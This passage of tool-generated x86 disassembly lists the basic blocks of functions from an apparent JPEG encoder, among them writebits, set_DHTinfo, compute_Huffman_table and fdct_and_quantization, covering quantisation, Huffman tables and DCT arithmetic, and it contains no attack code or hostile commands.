0x804cd71:	movzx	edi, byte ptr [esp + 6]
0x804cd76:	mov	esi, dword ptr [esp + 0xc0c]
0x804cd7d:	push	eax
0x804cd7e:	push	eax
0x804cd7f:	push	edi
0x804cd80:	push	esi
0x804cd81:	call	0x804ccbd
None
|
|
|
v
0x804cd65:	cmp	eax, 0xc01
0x804cd6a:	jg	0x804cd71
None
|
|
|
v
0x804cce9:	lea	ebp, dword ptr [esp + 6]
0x804cced:	call	0x80530e0
None
|
|
|
v
0x804cd71:	movzx	edi, byte ptr [esp + 6]
0x804cd76:	mov	esi, dword ptr [esp + 0xc0c]
0x804cd7d:	push	eax
0x804cd7e:	push	eax
0x804cd7f:	push	edi
0x804cd80:	push	esi
0x804cd81:	call	0x804ccbd
None
|
|
|
v
0x804cdc0:	sub	esp, 0xc
0x804cdc3:	lea	ebx, dword ptr [esp + 0xc18]
0x804cdca:	push	ebx
0x804cdcb:	call	0x804e827
None
|
|
|
v
0x804cd86:	add	esp, 0x10
0x804cd89:	test	al, al
0x804cd8b:	jne	0x804cdaa
None
|
|
|
v
0x804ccda:	push	ebp
0x804ccdb:	push	edi
0x804ccdc:	push	esi
0x804ccdd:	push	ebx
0x804ccde:	sub	esp, 0xc1c
0x804cce4:	call	0x8054535
None
|
|
|
v
0x804cda8:	jmp	0x804cdb8
None
|
|
|
v
0x804cd35:	mov	esi, dword ptr [esp + 0xc08]
0x804cd3c:	mov	ebx, dword ptr [esp + 0xc0c]
0x804cd43:	push	eax
0x804cd44:	push	eax
0x804cd45:	push	esi
0x804cd46:	push	ebx
0x804cd47:	call	0x804cc97
None
|
|
|
v
0x804cd5c:	add	esp, 0x10
0x804cd5f:	test	eax, eax
0x804cd61:	mov	ebx, eax
0x804cd63:	jle	0x804cd07
None
|
|
|
v
0x804cdd5:	add	esp, 0x10
0x804cdd8:	call	0x804ea8c
None
|
|
|
v
0x804cdaa:	dec	ebx
0x804cdab:	push	ebx
0x804cdac:	lea	eax, dword ptr [esp + 0xb]
0x804cdb0:	push	eax
0x804cdb1:	push	edi
0x804cdb2:	push	esi
0x804cdb3:	call	0x804c050
None
|
|
|
v
0x804cd07:	mov	dword ptr [esp + 0xc08], 0
0x804cd12:	push	eax
0x804cd13:	push	4
0x804cd15:	lea	eax, dword ptr [esp + 0xc10]
0x804cd1c:	push	eax
0x804cd1d:	push	dword ptr [esp + 0xc18]
0x804cd24:	call	0x804eba2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:writebyte
TOTAL BLOCKS :1
0x804ce14:	mov	eax, dword ptr [0x8058744]
0x804ce19:	mov	edx, dword ptr [0x8058748]
0x804ce1f:	mov	ecx, dword ptr [esp + 4]
0x804ce23:	mov	byte ptr [edx + eax], cl
0x804ce26:	inc	dword ptr [0x8058744]
0x804ce2c:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:writeword
TOTAL BLOCKS :2
0x804ce3e:	pop	eax
0x804ce3f:	mov	dword ptr [esp + 8], ebx
0x804ce43:	pop	ebx
0x804ce44:	jmp	0x804ce14
None
|
|
|
v
0x804ce2d:	push	ebx
0x804ce2e:	mov	ebx, dword ptr [esp + 8]
0x804ce32:	movzx	eax, bh
0x804ce35:	movzx	ebx, bl
0x804ce38:	push	eax
0x804ce39:	call	0x804ce14
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:set_quant_table
TOTAL BLOCKS :8
0x804ce98:	pop	ebx
0x804ce99:	pop	esi
0x804ce9a:	pop	edi
0x804ce9b:	pop	ebp
0x804ce9c:	ret	
None
|
|
|
v
0x804ce49:	push	ebp
0x804ce4a:	xor	ecx, ecx
0x804ce4c:	push	edi
0x804ce4d:	push	esi
0x804ce4e:	push	ebx
0x804ce4f:	mov	edi, dword ptr [esp + 0x14]
0x804ce53:	mov	ebx, 0x64
0x804ce58:	mov	ebp, dword ptr [esp + 0x1c]
0x804ce5c:	movzx	esi, byte ptr [esp + 0x18]
0x804ce61:	movzx	eax, byte ptr [edi + ecx]
0x804ce65:	imul	eax, esi
0x804ce68:	add	eax, 0x32
0x804ce6b:	cdq	
0x804ce6c:	idiv	ebx
0x804ce6e:	test	eax, eax
0x804ce70:	je	0x804ce7b
None
|
|
|
v
0x804ce61:	movzx	eax, byte ptr [edi + ecx]
0x804ce65:	imul	eax, esi
0x804ce68:	add	eax, 0x32
0x804ce6b:	cdq	
0x804ce6c:	idiv	ebx
0x804ce6e:	test	eax, eax
0x804ce70:	je	0x804ce7b
None
|
|
|
v
0x804ce72:	cmp	eax, 0xff
0x804ce77:	jg	0x804ce82
None
|
|
|
v
0x804ce7b:	mov	eax, 1
0x804ce80:	jmp	0x804ce87
None
|
|
|
v
0x804ce82:	mov	eax, 0xff
0x804ce87:	movzx	edx, byte ptr [ecx + 0x8055ff8]
0x804ce8e:	inc	ecx
0x804ce8f:	cmp	ecx, 0x40
0x804ce92:	mov	byte ptr [ebp + edx], al
0x804ce96:	jne	0x804ce61
None
|
|
|
v
0x804ce87:	movzx	edx, byte ptr [ecx + 0x8055ff8]
0x804ce8e:	inc	ecx
0x804ce8f:	cmp	ecx, 0x40
0x804ce92:	mov	byte ptr [ebp + edx], al
0x804ce96:	jne	0x804ce61
None
|
|
|
v
0x804ce79:	jmp	0x804ce87
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:set_DQTinfo
TOTAL BLOCKS :3
0x804ced4:	movzx	eax, byte ptr [0x8058740]
0x804cedb:	push	0x8058796
0x804cee0:	push	eax
0x804cee1:	push	0x8058168
0x804cee6:	call	0x804ce49
None
|
|
|
v
0x804ce9d:	movzx	eax, byte ptr [0x8058740]
0x804cea4:	push	0x8058755
0x804cea9:	mov	word ptr [0x8058750], 0xffdb
0x804ceb2:	push	eax
0x804ceb3:	push	0x8058128
0x804ceb8:	mov	word ptr [0x8058752], 0x84
0x804cec1:	mov	byte ptr [0x8058754], 0
0x804cec8:	mov	byte ptr [0x8058795], 1
0x804cecf:	call	0x804ce49
None
|
|
|
v
0x804ceeb:	add	esp, 0x18
0x804ceee:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:set_DHTinfo
TOTAL BLOCKS :17
0x804cfad:	mov	dl, byte ptr [eax + 0x80582b4]
0x804cfb3:	mov	byte ptr [eax + 0x80588da], dl
0x804cfb9:	inc	eax
0x804cfba:	cmp	eax, 0xa2
0x804cfbf:	jne	0x804cfad
None
|
|
|
v
0x804ceef:	mov	word ptr [0x80587d8], 0xffc4
0x804cef8:	xor	eax, eax
0x804cefa:	mov	word ptr [0x80587da], 0x1a2
0x804cf03:	mov	byte ptr [0x80587dc], 0
0x804cf0a:	mov	dl, byte ptr [eax + 0x80581a9]
0x804cf10:	mov	byte ptr [eax + 0x80587dd], dl
0x804cf16:	inc	eax
0x804cf17:	cmp	eax, 0x10
0x804cf1a:	jne	0x804cf0a
None
|
|
|
v
0x804cf39:	mov	dl, byte ptr [eax + 0x80581c9]
0x804cf3f:	mov	byte ptr [eax + 0x80587fa], dl
0x804cf45:	inc	eax
0x804cf46:	cmp	eax, 0x10
0x804cf49:	jne	0x804cf39
None
|
|
|
v
0x804cf61:	mov	byte ptr [0x80588ac], 1
0x804cf68:	xor	al, al
0x804cf6a:	mov	dl, byte ptr [eax + 0x8058281]
0x804cf70:	mov	byte ptr [eax + 0x80588ad], dl
0x804cf76:	inc	eax
0x804cf77:	cmp	eax, 0x10
0x804cf7a:	jne	0x804cf6a
None
|
|
|
v
0x804cf6a:	mov	dl, byte ptr [eax + 0x8058281]
0x804cf70:	mov	byte ptr [eax + 0x80588ad], dl
0x804cf76:	inc	eax
0x804cf77:	cmp	eax, 0x10
0x804cf7a:	jne	0x804cf6a
None
|
|
|
v
0x804cf90:	mov	byte ptr [0x80588c9], 0x11
0x804cf97:	xor	al, al
0x804cf99:	mov	dl, byte ptr [eax + 0x80582a1]
0x804cf9f:	mov	byte ptr [eax + 0x80588ca], dl
0x804cfa5:	inc	eax
0x804cfa6:	cmp	eax, 0x10
0x804cfa9:	jne	0x804cf99
None
|
|
|
v
0x804cf4b:	xor	al, al
0x804cf4d:	mov	dl, byte ptr [eax + 0x80581dc]
0x804cf53:	mov	byte ptr [eax + 0x805880a], dl
0x804cf59:	inc	eax
0x804cf5a:	cmp	eax, 0xa2
0x804cf5f:	jne	0x804cf4d
None
|
|
|
v
0x804cf0a:	mov	dl, byte ptr [eax + 0x80581a9]
0x804cf10:	mov	byte ptr [eax + 0x80587dd], dl
0x804cf16:	inc	eax
0x804cf17:	cmp	eax, 0x10
0x804cf1a:	jne	0x804cf0a
None
|
|
|
v
0x804cf99:	mov	dl, byte ptr [eax + 0x80582a1]
0x804cf9f:	mov	byte ptr [eax + 0x80588ca], dl
0x804cfa5:	inc	eax
0x804cfa6:	cmp	eax, 0x10
0x804cfa9:	jne	0x804cf99
None
|
|
|
v
0x804cf30:	mov	byte ptr [0x80587f9], 0x10
0x804cf37:	xor	al, al
0x804cf39:	mov	dl, byte ptr [eax + 0x80581c9]
0x804cf3f:	mov	byte ptr [eax + 0x80587fa], dl
0x804cf45:	inc	eax
0x804cf46:	cmp	eax, 0x10
0x804cf49:	jne	0x804cf39
None
|
|
|
v
0x804cf1c:	xor	al, al
0x804cf1e:	mov	dl, byte ptr [eax + 0x80581bc]
0x804cf24:	mov	byte ptr [eax + 0x80587ed], dl
0x804cf2a:	inc	eax
0x804cf2b:	cmp	eax, 0xc
0x804cf2e:	jne	0x804cf1e
None
|
|
|
v
0x804cfab:	xor	al, al
0x804cfad:	mov	dl, byte ptr [eax + 0x80582b4]
0x804cfb3:	mov	byte ptr [eax + 0x80588da], dl
0x804cfb9:	inc	eax
0x804cfba:	cmp	eax, 0xa2
0x804cfbf:	jne	0x804cfad
None
|
|
|
v
0x804cf7e:	mov	dl, byte ptr [eax + 0x8058294]
0x804cf84:	mov	byte ptr [eax + 0x80588bd], dl
0x804cf8a:	inc	eax
0x804cf8b:	cmp	eax, 0xc
0x804cf8e:	jne	0x804cf7e
None
|
|
|
v
0x804cf4d:	mov	dl, byte ptr [eax + 0x80581dc]
0x804cf53:	mov	byte ptr [eax + 0x805880a], dl
0x804cf59:	inc	eax
0x804cf5a:	cmp	eax, 0xa2
0x804cf5f:	jne	0x804cf4d
None
|
|
|
v
0x804cf1e:	mov	dl, byte ptr [eax + 0x80581bc]
0x804cf24:	mov	byte ptr [eax + 0x80587ed], dl
0x804cf2a:	inc	eax
0x804cf2b:	cmp	eax, 0xc
0x804cf2e:	jne	0x804cf1e
None
|
|
|
v
0x804cf7c:	xor	al, al
0x804cf7e:	mov	dl, byte ptr [eax + 0x8058294]
0x804cf84:	mov	byte ptr [eax + 0x80588bd], dl
0x804cf8a:	inc	eax
0x804cf8b:	cmp	eax, 0xc
0x804cf8e:	jne	0x804cf7e
None
|
|
|
v
0x804cfc1:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:writebits
TOTAL BLOCKS :14
0x804d02d:	pop	edx
0x804d02e:	mov	byte ptr [0x8058356], 7
0x804d035:	mov	byte ptr [0x805897c], 0
0x804d03c:	sub	esi, 2
0x804d03f:	test	bl, bl
0x804d041:	jns	0x804cfd7
None
|
|
|
v
0x804d006:	mov	al, byte ptr [0x805897c]
0x804d00b:	cmp	al, 0xff
0x804d00d:	jne	0x804d024
None
|
|
|
v
0x804d024:	movzx	eax, al
0x804d027:	push	eax
0x804d028:	call	0x804ce14
None
|
|
|
v
0x804cfd7:	test	word ptr [esi + edi*2 + 0x8056038], bp
0x804cfdf:	je	0x804cff6
None
|
|
|
v
0x804d03f:	test	bl, bl
0x804d041:	jns	0x804cfd7
None
|
|
|
v
0x804cfc2:	push	ebp
0x804cfc3:	push	edi
0x804cfc4:	push	esi
0x804cfc5:	xor	esi, esi
0x804cfc7:	push	ebx
0x804cfc8:	mov	ebx, dword ptr [esp + 0x14]
0x804cfcc:	mov	ebp, ebx
0x804cfce:	dec	ebx
0x804cfcf:	shr	ebp, 0x10
0x804cfd2:	movsx	edi, bl
0x804cfd5:	jmp	0x804d03f
None
|
|
|
v
0x804cff6:	mov	al, byte ptr [0x8058356]
0x804cffb:	dec	ebx
0x804cffc:	dec	eax
0x804cffd:	test	al, al
0x804cfff:	mov	byte ptr [0x8058356], al
0x804d004:	jns	0x804d03c
None
|
|
|
v
0x804d00f:	push	0xff
0x804d014:	call	0x804ce14
None
|
|
|
v
0x804d019:	push	0
0x804d01b:	call	0x804ce14
None
|
|
|
v
0x804cfe1:	movsx	eax, byte ptr [0x8058356]
0x804cfe8:	mov	ax, word ptr [eax + eax + 0x8056038]
0x804cff0:	or	byte ptr [0x805897c], al
0x804cff6:	mov	al, byte ptr [0x8058356]
0x804cffb:	dec	ebx
0x804cffc:	dec	eax
0x804cffd:	test	al, al
0x804cfff:	mov	byte ptr [0x8058356], al
0x804d004:	jns	0x804d03c
None
|
|
|
v
0x804d02e:	mov	byte ptr [0x8058356], 7
0x804d035:	mov	byte ptr [0x805897c], 0
0x804d03c:	sub	esi, 2
0x804d03f:	test	bl, bl
0x804d041:	jns	0x804cfd7
None
|
|
|
v
0x804d020:	pop	ecx
0x804d021:	pop	eax
0x804d022:	jmp	0x804d02e
None
|
|
|
v
0x804d03c:	sub	esi, 2
0x804d03f:	test	bl, bl
0x804d041:	jns	0x804cfd7
None
|
|
|
v
0x804d043:	pop	ebx
0x804d044:	pop	esi
0x804d045:	pop	edi
0x804d046:	pop	ebp
0x804d047:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:compute_Huffman_table
TOTAL BLOCKS :6
0x804d08b:	mov	esi, 1
0x804d090:	mov	dword ptr [esp], ebx
0x804d093:	jmp	0x804d076
None
|
|
|
v
0x804d059:	movzx	edi, cl
0x804d05c:	mov	ebp, dword ptr [esp + 0x20]
0x804d060:	inc	ecx
0x804d061:	add	edi, dword ptr [esp + 0x1c]
0x804d065:	inc	esi
0x804d066:	movzx	ebx, byte ptr [edi]
0x804d069:	mov	word ptr [ebp + ebx*4 + 2], ax
0x804d06e:	movzx	edi, byte ptr [edi]
0x804d071:	inc	eax
0x804d072:	mov	byte ptr [ebp + edi*4], dl
0x804d076:	mov	edi, dword ptr [esp]
0x804d079:	mov	ebx, esi
0x804d07b:	cmp	bl, byte ptr [edi + 1]
0x804d07e:	jbe	0x804d059
None
|
|
|
v
0x804d095:	pop	eax
0x804d096:	pop	ebx
0x804d097:	pop	esi
0x804d098:	pop	edi
0x804d099:	pop	ebp
0x804d09a:	ret	
None
|
|
|
v
0x804d080:	mov	ebx, edi
0x804d082:	inc	edx
0x804d083:	add	eax, eax
0x804d085:	inc	ebx
0x804d086:	cmp	dl, 0x11
0x804d089:	je	0x804d095
None
|
|
|
v
0x804d048:	push	ebp
0x804d049:	mov	dl, 1
0x804d04b:	push	edi
0x804d04c:	xor	ecx, ecx
0x804d04e:	push	esi
0x804d04f:	push	ebx
0x804d050:	push	eax
0x804d051:	xor	eax, eax
0x804d053:	mov	ebx, dword ptr [esp + 0x18]
0x804d057:	jmp	0x804d08b
None
|
|
|
v
0x804d076:	mov	edi, dword ptr [esp]
0x804d079:	mov	ebx, esi
0x804d07b:	cmp	bl, byte ptr [edi + 1]
0x804d07e:	jbe	0x804d059
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:init_Huffman_tables
TOTAL BLOCKS :5
0x804d0af:	push	0x80589b0
0x804d0b4:	push	0x8058294
0x804d0b9:	push	0x8058280
0x804d0be:	call	0x804d048
None
|
|
|
v
0x804d0c3:	push	0x80589e0
0x804d0c8:	push	0x80581dc
0x804d0cd:	push	0x80581c8
0x804d0d2:	call	0x804d048
None
|
|
|
v
0x804d09b:	push	0x8058980
0x804d0a0:	push	0x80581bc
0x804d0a5:	push	0x80581a8
0x804d0aa:	call	0x804d048
None
|
|
|
v
0x804d0d7:	add	esp, 0x24
0x804d0da:	push	0x8058de0
0x804d0df:	push	0x80582b4
0x804d0e4:	push	0x80582a0
0x804d0e9:	call	0x804d048
None
|
|
|
v
0x804d0ee:	add	esp, 0xc
0x804d0f1:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:precalculate_YCbCr_tables
TOTAL BLOCKS :7
0x804d15c:	xor	eax, eax
0x804d15e:	xor	edx, edx
0x804d160:	mov	ecx, eax
0x804d162:	shl	ecx, 0xd
0x804d165:	mov	dword ptr [eax + 0x805ade0], ecx
0x804d16b:	imul	ecx, eax, 0xfffffacc
0x804d171:	mov	dword ptr [eax + 0x805a9e0], edx
0x804d177:	add	edx, 0x1d2f
0x804d17d:	mov	dword ptr [eax + 0x805b1e0], ecx
0x804d183:	add	eax, 4
0x804d186:	cmp	edx, 0x1d2f00
0x804d18c:	jne	0x804d160
None
|
|
|
v
0x804d127:	xor	ecx, ecx
0x804d129:	xor	eax, eax
0x804d12b:	xor	edx, edx
0x804d12d:	imul	ebx, eax, 0xffffeacd
0x804d133:	mov	dword ptr [eax + 0x8059de0], edx
0x804d139:	add	edx, 0x9646
0x804d13f:	mov	dword ptr [eax + 0x805a5e0], ecx
0x804d145:	sub	ecx, 0x6b2e
0x804d14b:	mov	dword ptr [eax + 0x805a1e0], ebx
0x804d151:	add	eax, 4
0x804d154:	cmp	edx, 0x964600
0x804d15a:	jne	0x804d12d
None
|
|
|
v
0x804d160:	mov	ecx, eax
0x804d162:	shl	ecx, 0xd
0x804d165:	mov	dword ptr [eax + 0x805ade0], ecx
0x804d16b:	imul	ecx, eax, 0xfffffacc
0x804d171:	mov	dword ptr [eax + 0x805a9e0], edx
0x804d177:	add	edx, 0x1d2f
0x804d17d:	mov	dword ptr [eax + 0x805b1e0], ecx
0x804d183:	add	eax, 4
0x804d186:	cmp	edx, 0x1d2f00
0x804d18c:	jne	0x804d160
None
|
|
|
v
0x804d12d:	imul	ebx, eax, 0xffffeacd
0x804d133:	mov	dword ptr [eax + 0x8059de0], edx
0x804d139:	add	edx, 0x9646
0x804d13f:	mov	dword ptr [eax + 0x805a5e0], ecx
0x804d145:	sub	ecx, 0x6b2e
0x804d14b:	mov	dword ptr [eax + 0x805a1e0], ebx
0x804d151:	add	eax, 4
0x804d154:	cmp	edx, 0x964600
0x804d15a:	jne	0x804d12d
None
|
|
|
v
0x804d0f9:	mov	ebx, eax
0x804d0fb:	mov	dword ptr [eax + 0x80591e0], edx
0x804d101:	shl	ebx, 0xd
0x804d104:	add	edx, 0x4c8b
0x804d10a:	mov	dword ptr [eax + 0x80595e0], ecx
0x804d110:	sub	ecx, 0x2b32
0x804d116:	mov	dword ptr [eax + 0x80599e0], ebx
0x804d11c:	add	eax, 4
0x804d11f:	cmp	edx, 0x4c8b00
0x804d125:	jne	0x804d0f9
None
|
|
|
v
0x804d0f2:	push	ebx
0x804d0f3:	xor	ecx, ecx
0x804d0f5:	xor	eax, eax
0x804d0f7:	xor	edx, edx
0x804d0f9:	mov	ebx, eax
0x804d0fb:	mov	dword ptr [eax + 0x80591e0], edx
0x804d101:	shl	ebx, 0xd
0x804d104:	add	edx, 0x4c8b
0x804d10a:	mov	dword ptr [eax + 0x80595e0], ecx
0x804d110:	sub	ecx, 0x2b32
0x804d116:	mov	dword ptr [eax + 0x80599e0], ebx
0x804d11c:	add	eax, 4
0x804d11f:	cmp	edx, 0x4c8b00
0x804d125:	jne	0x804d0f9
None
|
|
|
v
0x804d18e:	pop	ebx
0x804d18f:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:prepare_quant_tables
TOTAL BLOCKS :7
0x804d218:	fstp	st(0)
0x804d21a:	add	esp, 0x48
0x804d21d:	pop	ebx
0x804d21e:	pop	esi
0x804d21f:	pop	edi
0x804d220:	ret	
None
|
|
|
v
0x804d204:	fstp	st(0)
0x804d206:	add	eax, 8
0x804d209:	cmp	eax, 0x40
0x804d20c:	je	0x804d218
None
|
|
|
v
0x804d20e:	mov	edi, eax
0x804d210:	fld	qword ptr [esp + eax + 8]
0x804d214:	xor	edx, edx
0x804d216:	jmp	0x804d1b0
None
|
|
|
v
0x804d1ac:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x804d190:	push	edi
0x804d191:	mov	ecx, 0x10
0x804d196:	push	esi
0x804d197:	xor	eax, eax
0x804d199:	push	ebx
0x804d19a:	mov	esi, 0x8055fb8
0x804d19f:	sub	esp, 0x48
0x804d1a2:	lea	edi, dword ptr [esp + 8]
0x804d1a6:	fld	dword ptr [0x8056058]
0x804d1ac:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x804d1b0:	lea	ecx, dword ptr [edi + edx]
0x804d1b3:	fld	qword ptr [esp + edx*8 + 8]
0x804d1b7:	inc	edx
0x804d1b8:	movzx	ecx, cl
0x804d1bb:	cmp	edx, 8
0x804d1be:	movzx	esi, byte ptr [ecx + 0x8055ff8]
0x804d1c5:	fld	st(1)
0x804d1c7:	movzx	ebx, byte ptr [esi + 0x8058755]
0x804d1ce:	movzx	esi, byte ptr [esi + 0x8058796]
0x804d1d5:	push	ebx
0x804d1d6:	fimul	word ptr [esp]
0x804d1d9:	mov	dword ptr [esp], esi
0x804d1dc:	fmul	st(1)
0x804d1de:	fmul	st(3)
0x804d1e0:	fld1	
0x804d1e2:	fdivr	st(1), st(0)
0x804d1e4:	fxch	st(1)
0x804d1e6:	fstp	dword ptr [ecx*4 + 0x805b5e0]
0x804d1ed:	fld	st(2)
0x804d1ef:	fimul	word ptr [esp]
0x804d1f2:	pop	ebx
0x804d1f3:	fmulp	st(2)
0x804d1f5:	fxch	st(1)
0x804d1f7:	fmul	st(3)
0x804d1f9:	fdivp	st(1)
0x804d1fb:	fstp	dword ptr [ecx*4 + 0x805b6e0]
0x804d202:	jne	0x804d1b0
None
|
|
|
v
0x804d1ae:	jmp	0x804d20e
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fdct_and_quantization
TOTAL BLOCKS :9
0x804d41d:	fnstcw	word ptr [esp + 0xe]
0x804d421:	xor	eax, eax
0x804d423:	fld	dword ptr [0x805606c]
0x804d429:	mov	dx, word ptr [esp + 0xe]
0x804d42e:	or	dh, 0xc
0x804d431:	mov	word ptr [esp + 0xc], dx
0x804d436:	fld	dword ptr [esp + eax*2 + 0x10]
0x804d43a:	fmul	dword ptr [ecx + eax*2]
0x804d43d:	fadd	st(1)
0x804d43f:	fldcw	word ptr [esp + 0xc]
0x804d443:	fistp	word ptr [esp + 0xa]
0x804d447:	fldcw	word ptr [esp + 0xe]
0x804d44b:	mov	dx, word ptr [esp + 0xa]
0x804d450:	sub	dx, 0x4000
0x804d455:	mov	word ptr [ebx + eax], dx
0x804d459:	add	eax, 2
0x804d45c:	cmp	eax, 0x80
0x804d461:	jne	0x804d436
None
|
|
|
v
0x804d436:	fld	dword ptr [esp + eax*2 + 0x10]
0x804d43a:	fmul	dword ptr [ecx + eax*2]
0x804d43d:	fadd	st(1)
0x804d43f:	fldcw	word ptr [esp + 0xc]
0x804d443:	fistp	word ptr [esp + 0xa]
0x804d447:	fldcw	word ptr [esp + 0xe]
0x804d44b:	mov	dx, word ptr [esp + 0xa]
0x804d450:	sub	dx, 0x4000
0x804d455:	mov	word ptr [ebx + eax], dx
0x804d459:	add	eax, 2
0x804d45c:	cmp	eax, 0x80
0x804d461:	jne	0x804d436
None
|
|
|
v
0x804d263:	fld	dword ptr [eax]
0x804d265:	fld	dword ptr [eax + 0x1c]
0x804d268:	fld	st(1)
0x804d26a:	fadd	st(1)
0x804d26c:	fxch	st(1)
0x804d26e:	fsubp	st(2)
0x804d270:	fld	dword ptr [eax + 4]
0x804d273:	fld	dword ptr [eax + 0x18]
0x804d276:	fld	st(1)
0x804d278:	fadd	st(1)
0x804d27a:	fxch	st(2)
0x804d27c:	fsubrp	st(1)
0x804d27e:	fstp	dword ptr [esp]
0x804d281:	fld	dword ptr [eax + 8]
0x804d284:	fld	dword ptr [eax + 0x14]
0x804d287:	fld	st(1)
0x804d289:	fadd	st(1)
0x804d28b:	fxch	st(2)
0x804d28d:	fsubrp	st(1)
0x804d28f:	fstp	dword ptr [esp + 4]
0x804d293:	fld	dword ptr [eax + 0x10]
0x804d296:	fld	dword ptr [eax + 0xc]
0x804d299:	fadd	st(1)
0x804d29b:	fld	st(4)
0x804d29d:	fadd	st(1)
0x804d29f:	fxch	st(1)
0x804d2a1:	fsubp	st(5)
0x804d2a3:	fld	st(3)
0x804d2a5:	fadd	st(3)
0x804d2a7:	fld	st(1)
0x804d2a9:	fadd	st(1)
0x804d2ab:	fstp	dword ptr [eax]
0x804d2ad:	fsubp	st(1)
0x804d2af:	fstp	dword ptr [eax + 0x10]
0x804d2b2:	fxch	st(1)
0x804d2b4:	fsubp	st(2)
0x804d2b6:	fxch	st(1)
0x804d2b8:	fadd	st(2)
0x804d2ba:	fmul	dword ptr [0x805605c]
0x804d2c0:	fld	st(2)
0x804d2c2:	fadd	st(1)
0x804d2c4:	fstp	dword ptr [eax + 8]
0x804d2c7:	fsubp	st(2)
0x804d2c9:	fxch	st(1)
0x804d2cb:	fstp	dword ptr [eax + 0x18]
0x804d2ce:	fsubr	dword ptr [eax + 0xc]
0x804d2d1:	fadd	dword ptr [esp + 4]
0x804d2d5:	fld	dword ptr [esp]
0x804d2d8:	fadd	st(2)
0x804d2da:	fld	st(1)
0x804d2dc:	fsub	st(1)
0x804d2de:	fmul	dword ptr [0x8056060]
0x804d2e4:	fxch	st(2)
0x804d2e6:	fmul	dword ptr [0x8056064]
0x804d2ec:	fadd	st(2)
0x804d2ee:	fxch	st(1)
0x804d2f0:	fmul	dword ptr [0x8056068]
0x804d2f6:	faddp	st(2)
0x804d2f8:	fld	dword ptr [esp + 4]
0x804d2fc:	fadd	dword ptr [esp]
0x804d2ff:	fmul	dword ptr [0x805605c]
0x804d305:	fld	st(3)
0x804d307:	fadd	st(1)
0x804d309:	fxch	st(4)
0x804d30b:	fsubrp	st(1)
0x804d30d:	fld	st(0)
0x804d30f:	fadd	st(2)
0x804d311:	fstp	dword ptr [eax + 0x14]
0x804d314:	fsubrp	st(1)
0x804d316:	fstp	dword ptr [eax + 0xc]
0x804d319:	fld	st(1)
0x804d31b:	fadd	st(1)
0x804d31d:	fstp	dword ptr [eax + 4]
0x804d320:	fsubp	st(1)
0x804d322:	fstp	dword ptr [eax + 0x1c]
0x804d325:	add	eax, 0x20
0x804d328:	cmp	eax, edx
0x804d32a:	jne	0x804d263
None
|
|
|
v
0x804d221:	push	esi
0x804d222:	xor	eax, eax
0x804d224:	push	ebx
0x804d225:	sub	esp, 0x114
0x804d22b:	mov	edx, dword ptr [esp + 0x120]
0x804d232:	mov	ecx, dword ptr [esp + 0x124]
0x804d239:	mov	ebx, dword ptr [esp + 0x128]
0x804d240:	movsx	si, byte ptr [edx + eax]
0x804d245:	mov	word ptr [esp + 0xa], si
0x804d24a:	fild	word ptr [esp + 0xa]
0x804d24e:	fstp	dword ptr [esp + eax*4 + 0x10]
0x804d252:	inc	eax
0x804d253:	cmp	eax, 0x40
0x804d256:	jne	0x804d240
None
|
|
|
v
0x804d240:	movsx	si, byte ptr [edx + eax]
0x804d245:	mov	word ptr [esp + 0xa], si
0x804d24a:	fild	word ptr [esp + 0xa]
0x804d24e:	fstp	dword ptr [esp + eax*4 + 0x10]
0x804d252:	inc	eax
0x804d253:	cmp	eax, 0x40
0x804d256:	jne	0x804d240
None
|
|
|
v
0x804d338:	fld	dword ptr [eax]
0x804d33a:	fld	dword ptr [eax + 0xe0]
0x804d340:	fld	st(1)
0x804d342:	fadd	st(1)
0x804d344:	fxch	st(1)
0x804d346:	fsubp	st(2)
0x804d348:	fld	dword ptr [eax + 0x20]
0x804d34b:	fld	dword ptr [eax + 0xc0]
0x804d351:	fld	st(1)
0x804d353:	fadd	st(1)
0x804d355:	fxch	st(2)
0x804d357:	fsubrp	st(1)
0x804d359:	fstp	dword ptr [esp]
0x804d35c:	fld	dword ptr [eax + 0x40]
0x804d35f:	fld	dword ptr [eax + 0xa0]
0x804d365:	fld	st(1)
0x804d367:	fadd	st(1)
0x804d369:	fxch	st(2)
0x804d36b:	fsubrp	st(1)
0x804d36d:	fstp	dword ptr [esp + 4]
0x804d371:	fld	dword ptr [eax + 0x80]
0x804d377:	fld	dword ptr [eax + 0x60]
0x804d37a:	fadd	st(1)
0x804d37c:	fld	st(4)
0x804d37e:	fadd	st(1)
0x804d380:	fxch	st(1)
0x804d382:	fsubp	st(5)
0x804d384:	fld	st(3)
0x804d386:	fadd	st(3)
0x804d388:	fld	st(1)
0x804d38a:	fadd	st(1)
0x804d38c:	fstp	dword ptr [eax]
0x804d38e:	fsubp	st(1)
0x804d390:	fstp	dword ptr [eax + 0x80]
0x804d396:	fxch	st(1)
0x804d398:	fsubp	st(2)
0x804d39a:	fxch	st(1)
0x804d39c:	fadd	st(2)
0x804d39e:	fmul	dword ptr [0x805605c]
0x804d3a4:	fld	st(2)
0x804d3a6:	fadd	st(1)
0x804d3a8:	fstp	dword ptr [eax + 0x40]
0x804d3ab:	fsubp	st(2)
0x804d3ad:	fxch	st(1)
0x804d3af:	fstp	dword ptr [eax + 0xc0]
0x804d3b5:	fsubr	dword ptr [eax + 0x60]
0x804d3b8:	fadd	dword ptr [esp + 4]
0x804d3bc:	fld	dword ptr [esp]
0x804d3bf:	fadd	st(2)
0x804d3c1:	fld	st(1)
0x804d3c3:	fsub	st(1)
0x804d3c5:	fmul	dword ptr [0x8056060]
0x804d3cb:	fxch	st(2)
